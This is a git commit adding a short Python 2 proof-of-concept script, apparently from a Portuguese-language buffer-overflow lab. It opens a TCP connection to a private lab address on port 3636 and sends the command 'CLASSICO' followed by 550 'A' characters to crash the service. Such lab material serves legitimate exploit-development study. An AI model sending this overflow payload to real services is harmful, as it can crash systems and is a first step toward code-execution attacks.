e9cbae3aa36f66a7ac33c7d43a8c58dbf33f05cf
Matheus Tucunduva Pinheiro <56231649+mx61tt@users.noreply.github.com>
2022-03-14 18:04:55 -0300

    Create poc.py

---
+++ buffer-classico/scripts/poc.py
@@ -0,0 +1,19 @@
+#!/usr/bin/python                                                                                                                                                                                                                          
+import socket                                                                                                                                                                                                                              
+                                                                                                                                                                                                                                           
+IP="10.0.2.13"                                                                                                                                                                                                                             
+PORTA=3636                                                                                                                                                                                                                                 
+                                                                                                                                                                                                                                           
+payload = "A" * 550                                                                                                                                                                                                                                                                                                                                                                                                                                              
+
+buffer = "CLASSICO "
+buffer += payload
+
+print "[+] Enviando..."
+
+r = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+r.connect((IP,PORTA))
+
+r.send(buffer)
+
+r.close()
